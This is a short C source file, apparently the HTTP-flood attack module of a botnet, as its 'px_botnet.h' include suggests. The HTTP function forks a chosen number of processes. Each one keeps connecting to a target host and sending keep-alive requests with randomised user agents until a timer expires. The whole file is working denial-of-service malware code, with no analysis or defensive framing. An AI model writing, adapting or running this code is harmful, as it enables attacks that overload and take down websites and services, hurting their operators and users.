#include "../../includes/px_botnet.h"

extern const char *useragents[];

void HTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power)
{
	int socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[30000], buffer[1];

	for (i = 0; i < power; i++)
	{
		sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: Keep-Alive\r\n\r\n", method, path, host, useragents[(rand() % 36)]);
		if (fork())
		{
			
			while (end > time(NULL))
			{
				socket = socket_connect(host, port);
				if (socket != 0)
				{
					write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}